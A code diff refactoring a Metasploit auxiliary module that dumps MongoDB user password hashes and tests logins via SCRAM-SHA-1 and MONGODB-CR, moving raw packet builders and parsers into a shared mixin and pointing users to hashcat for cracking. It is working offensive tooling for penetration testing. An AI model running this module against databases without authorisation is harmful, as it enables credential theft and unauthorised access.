@@ -6,13 +6,12 @@
 require 'bson'
 require 'openssl'
 require 'digest'
-require 'stringio'
 require 'base64'
 
 class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::Mongodb
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
-  include Msf::Exploit::Remote::Tcp
 
   def initialize(info = {})
     super(
@@ -25,7 +24,10 @@ class MetasploitModule < Msf::Auxiliary
           credentials from the 'system.users' collection. Alternatively,
           it can dump application user hashes from a specified collection.
 
-          Use Hashcat mode 24100 for SCRAM-SHA-1 and 24200 for SCRAM-SHA-256
+          The dumped SCRAM hashes are formatted for Hashcat mode 24100 (SCRAM-SHA-1)
+          and 24200 (SCRAM-SHA-256), but are not yet wired into Metasploit's
+          auxiliary/analyze cracking modules -- use hashcat directly against the
+          exported hash, or 'creds -o' to export it, for now.
           Successfully tested against MongoDB 3.6 with and without authentication
         },
         'References' => [
@@ -35,10 +37,11 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'Author' => [
           'h00die',
+          'prithvee07'
         ],
         'License' => MSF_LICENSE,
         'Notes' => {
-          'Reliability' => [UNKNOWN_RELIABILITY],
+          'Reliability' => UNKNOWN_RELIABILITY,
           'Stability' => [CRASH_SAFE],
           'SideEffects' => [IOC_IN_LOGS]
         }
@@ -98,12 +101,12 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Dumping MongoDB system users from #{db}.system.users...")
 
     cmd = BSON::Document.new({})
-    pkt = build_query_packet("#{db}.system.users", cmd.to_bson.to_s)
+    pkt = mongodb_build_packet("#{db}.system.users", cmd.to_bson.to_s, number_to_return: -1)
 
     sock.put(pkt)
     resp = sock.get_once(-1, 10)
 
-    docs = parse_docs(resp)
+    docs = mongodb_parse_docs(resp)
 
     if docs.empty?
       print_warning('No users found or unable to parse')
@@ -170,12 +173,12 @@ class MetasploitModule < Msf::Auxiliary
     cmd = BSON::Document.new({
       hash_field => { '$exists' => true, '$ne' => '' }
     })
-    pkt = build_query_packet("#{db}.#{coll}", cmd.to_bson.to_s)
+    pkt = mongodb_build_packet("#{db}.#{coll}", cmd.to_bson.to_s, number_to_return: -1)
 
     sock.put(pkt)
     resp = sock.get_once(-1, 10)
 
-    docs = parse_docs(resp)
+    docs = mongodb_parse_docs(resp)
 
     if docs.empty?
       print_warning('No users found or unable to parse')
@@ -254,18 +257,16 @@ class MetasploitModule < Msf::Auxiliary
       'payload' => BSON::Binary.new(client_first_message)
     })
 
-    pkt = build_cmd_packet("#{db}.$cmd", sasl_start_cmd.to_bson.to_s)
+    pkt = mongodb_build_packet("#{db}.$cmd", sasl_start_cmd.to_bson.to_s)
     sock.put(pkt)
     resp = sock.get_once(-1, 5)
 
-    return nil unless resp && resp.length > 36
-
-    reply = parse_doc(resp)
+    reply = mongodb_parse_doc(resp)
     return nil unless reply && reply['ok'].to_i == 1
 
     conversation_id = reply['conversationId']
     server_payload = reply['payload'].data
-    server_vars = parse_scram_payload(server_payload)
+    server_vars = mongodb_parse_scram_payload(server_payload)
 
     server_nonce = server_vars['r']
     salt = Rex::Text.decode_base64(server_vars['s'])
@@ -296,13 +297,11 @@ class MetasploitModule < Msf::Auxiliary
       'payload' => BSON::Binary.new(client_final_message)
     })
 
-    pkt = build_cmd_packet("#{db}.$cmd", sasl_continue_cmd.to_bson.to_s)
+    pkt = mongodb_build_packet("#{db}.$cmd", sasl_continue_cmd.to_bson.to_s)
     sock.put(pkt)
     resp = sock.get_once(-1, 5)
 
-    return nil unless resp && resp.length > 36
-
-    reply = parse_doc(resp)
+    reply = mongodb_parse_doc(resp)
     if reply && reply['ok'].to_i == 1
       print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}' (SCRAM-SHA-1)")
       report_cred(
@@ -333,13 +332,11 @@ class MetasploitModule < Msf::Auxiliary
       'key' => key
     })
 
-    packet = build_cmd_packet("#{db}.$cmd", cmd.to_bson.to_s)
+    packet = mongodb_build_packet("#{db}.$cmd", cmd.to_bson.to_s)
     sock.put(packet)
     response = sock.get_once(-1, 5)
 
-    return nil unless response && response.length > 36
-
-    reply = parse_doc(response)
+    reply = mongodb_parse_doc(response)
     if reply && reply['ok'].to_i == 1
       print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}' (MONGODB-CR)")
       report_cred(
@@ -357,101 +354,6 @@ class MetasploitModule < Msf::Auxiliary
   rescue StandardError => e
     vprint_error("MONGODB-CR exception: #{e.message}")
     nil
-  end
-
-  def parse_scram_payload(payload)
-    payload.split(',').each_with_object({}) do |var, hash|
-      k, v = var.split('=', 2)
-      hash[k] = v if k && v
-    end
-  end
-
-  def parse_doc(response)
-    return nil if response.nil? || response.length <= 36
-
-    buffer = BSON::ByteBuffer.new(response[36..])
-    BSON::Document.from_bson(buffer)
-  rescue StandardError
-    nil
-  end
-
-  def parse_docs(response)
-    return [] if response.nil? || response.length <= 36
-
-    number_returned = response[32, 4].unpack('V')[0]
-
-    docs = []
-    data = response[36..]
-
-    return [] if data.nil? || data.empty?
-
-    buffer = StringIO.new(data)
-
-    number_returned.times do
-      break if buffer.eof?
-
-      begin
-        len_bytes = buffer.read(4)
-        break if len_bytes.nil? || len_bytes.length < 4
-
-        doc_len = len_bytes.unpack('V')[0]
-        break if doc_len.nil? || doc_len < 5
-
-        remaining = data.length - buffer.pos + 4
-        break if doc_len > remaining
-
-        buffer.pos -= 4
-        doc_bytes = buffer.read(doc_len)
-        break if doc_bytes.nil? || doc_bytes.length < doc_len
-
-        doc_buf = BSON::ByteBuffer.new(doc_bytes)
-        docs << BSON::Document.from_bson(doc_buf)
-      rescue StandardError => e
-        vprint_error("BSON parse error in multi-doc: #{e.message}")
-        break
-      end
-    end
-
-    docs
-  rescue StandardError => e
-    vprint_error("Parse docs error: #{e.message}")
-    []
-  end
-
-  def build_cmd_packet(coll_name, bson_payload)
-    coll_str = "#{coll_name}\x00"
-    req_id = Rex::Text.rand_text(4)
-    msg_len = 16 + 4 + coll_str.length + 4 + 4 + bson_payload.length
-
-    packet = [msg_len].pack('V')
-    packet << req_id # requestID (4 bytes) - Client-generated random ID to match the response
-    packet << "\x00\x00\x00\x00"   # responseTo (4 bytes) - Always 0 for a client request
-    packet << "\xd4\x07\x00\x00"   # opCode (4 bytes) - 2004 (0x000007D4 in little-endian) which is OP_QUERY
-    # --- End of standard 16-byte MongoDB Header ---
-
-    packet << "\x00\x00\x00\x00" # flags (4 bytes) - 0 means standard query (no special flags like TailableCursor or SlaveOk)
-    packet << coll_str # fullCollectionName (C-string) - The namespace (e.g., "admin.$cmd\0")
-    packet << "\x00\x00\x00\x00"   # numberToSkip (4 bytes) - 0 means don't skip any results
-    packet << "\x01\x00\x00\x00"   # numberToReturn (4 bytes) - 1 means return only the first document (standard for $cmd commands)
-    packet << bson_payload # query (BSON document) - The actual command/query to execute
-    packet
-  end
-
-  def build_query_packet(coll_name, bson_payload)
-    coll_str = "#{coll_name}\x00"
-    req_id = Rex::Text.rand_text(4)
-    msg_len = 16 + 4 + coll_str.length + 4 + 4 + bson_payload.length
-
-    packet = [msg_len].pack('V')
-    packet << req_id
-    packet << "\x00\x00\x00\x00"
-    packet << "\xd4\x07\x00\x00"
-    packet << "\x00\x00\x00\x00"
-    packet << coll_str
-    packet << "\x00\x00\x00\x00"
-    packet << [-1].pack('V')
-    packet << bson_payload
-    packet
   end
 
   def report_cred(opts)
@@ -483,37 +385,22 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_nonce
     cmd = BSON::Document.new({ 'getnonce' => BSON::Int32.new(1) })
-    pkt = build_cmd_packet("#{datastore['DB']}.$cmd", cmd.to_bson.to_s)
+    pkt = mongodb_build_packet("#{datastore['DB']}.$cmd", cmd.to_bson.to_s)
 
     sock.put(pkt)
     response = sock.get_once(-1, 5)
-    return '' unless response && response.length > 36
 
-    doc = parse_doc(response)
+    doc = mongodb_parse_doc(response)
     doc && doc['ok'].to_i == 1 ? doc['nonce'].to_s : ''
   end
 
   def require_auth?
     cmd = BSON::Document.new({ 'listDatabases' => BSON::Int32.new(1) })
-    list_db_pkt = build_cmd_packet('admin.$cmd', cmd.to_bson.to_s)
+    list_db_pkt = mongodb_build_packet('admin.$cmd', cmd.to_bson.to_s)
 
     sock.put(list_db_pkt)
     auth_resp = sock.get_once(-1, 5)
 
-    have_auth_error?(auth_resp)
-  end
-
-  def have_auth_error?(response)
-    return true if response.nil? || response.length <= 36
-
-    doc = parse_doc(response)
-    if doc
-      return true if doc['ok'].to_i == 0 || doc['errmsg']
-    else
-      documents = response[36..]
-      return documents.include?('errmsg') || documents.include?('unauthorized') || documents.include?('requires authentication')
-    end
-
-    false
+    mongodb_have_auth_error?(auth_resp)
   end
 end
